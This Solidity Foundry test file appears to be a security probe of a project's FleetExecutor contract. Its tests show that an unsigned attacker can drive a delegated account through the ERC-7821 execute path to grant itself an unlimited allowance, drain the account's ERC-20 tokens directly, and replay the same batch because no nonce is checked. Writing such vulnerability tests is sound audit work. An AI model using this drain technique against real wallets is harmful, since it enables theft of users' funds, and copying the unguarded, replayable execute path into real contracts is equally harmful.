// SPDX-License-Identifier: MIT
pragma solidity ^0.8.28;
import {Test} from "forge-std/Test.sol";
import {FleetExecutor} from "../../src/FleetExecutor.sol";

contract Tok {
    mapping(address=>uint) public balanceOf; mapping(address=>mapping(address=>uint)) public allowance;
    function mint(address t,uint a) external { balanceOf[t]+=a; }
    function approve(address s,uint a) external returns(bool){ allowance[msg.sender][s]=a; return true; }
    function transfer(address t,uint a) external returns(bool){ require(balanceOf[msg.sender]>=a,"BAL"); balanceOf[msg.sender]-=a; balanceOf[t]+=a; return true; }
    function transferFrom(address f,address t,uint a) external returns(bool){
        require(allowance[f][msg.sender]>=a,"ALLOW"); allowance[f][msg.sender]-=a; balanceOf[f]-=a; balanceOf[t]+=a; return true; }
}

/// @dev dex-critic probe: can an UNSIGNED third party drain an ERC-20 from the delegated EOA
/// via the permissionless ERC-7821 path?
contract ExecutorDrainProbe is Test {
    FleetExecutor exec; Tok tok; address USER; address ATTACKER;
    function setUp() public {
        USER=vm.addr(0xA11CE); ATTACKER=vm.addr(0xBAD);
        exec=new FleetExecutor(); tok=new Tok();
        vm.etch(USER, abi.encodePacked(hex"ef0100", address(exec)));
        tok.mint(USER, 1000e18);   // user holds 1000 tokens, approved nobody
    }
    function test_probe_unsigned7821_fullErc20Drain() public {
        assertEq(tok.balanceOf(USER), 1000e18);
        assertEq(tok.allowance(USER, ATTACKER), 0, "starts with no allowance");

        // STEP 1: attacker drives USER's frame via 7821 -> USER.approve(ATTACKER, MAX). No signature.
        FleetExecutor.Call[] memory c = new FleetExecutor.Call[](1);
        c[0]=FleetExecutor.Call(address(tok), 0, abi.encodeCall(Tok.approve,(ATTACKER, type(uint256).max)));
        vm.prank(ATTACKER);
        FleetExecutor(USER).executeBare(bytes32(uint256(0x01)<<248), abi.encode(c));
        assertEq(tok.allowance(USER, ATTACKER), type(uint256).max, "unsigned approve landed");

        // STEP 2: attacker pulls the whole balance.
        vm.prank(ATTACKER);
        tok.transferFrom(USER, ATTACKER, 1000e18);
        assertEq(tok.balanceOf(USER), 0, "EOA ERC-20 fully drained by an unsigned third party");
        assertEq(tok.balanceOf(ATTACKER), 1000e18);
    }
    function test_probe_unsigned7821_directTokenTransfer() public {
        // even simpler: one unsigned 7821 call makes the EOA send its OWN tokens out
        FleetExecutor.Call[] memory c = new FleetExecutor.Call[](1);
        c[0]=FleetExecutor.Call(address(tok), 0, abi.encodeCall(Tok.transfer,(ATTACKER, 1000e18)));
        vm.prank(ATTACKER);
        FleetExecutor(USER).executeBare(bytes32(uint256(0x01)<<248), abi.encode(c));
        assertEq(tok.balanceOf(ATTACKER), 1000e18, "unsigned single call drained the EOA's tokens");
    }
    /// PROBE: no nonce on the 7821 path -> the SAME batch replays. An attacker who sees a user's
    /// 7821 batch (e.g. a transfer) can re-send it, moving a second slice. There is no per-op
    /// replay guard on this entry.
    function test_probe_unsigned7821_isReplayable() public {
        FleetExecutor.Call[] memory c = new FleetExecutor.Call[](1);
        c[0]=FleetExecutor.Call(address(tok), 0, abi.encodeCall(Tok.transfer,(ATTACKER, 100e18)));
        vm.prank(ATTACKER); FleetExecutor(USER).executeBare(bytes32(uint256(0x01)<<248), abi.encode(c));
        assertEq(tok.balanceOf(ATTACKER), 100e18, "first send");
        vm.prank(ATTACKER); FleetExecutor(USER).executeBare(bytes32(uint256(0x01)<<248), abi.encode(c));  // SAME data
        assertEq(tok.balanceOf(ATTACKER), 200e18, "same batch replayed -> second slice moved");
    }
}
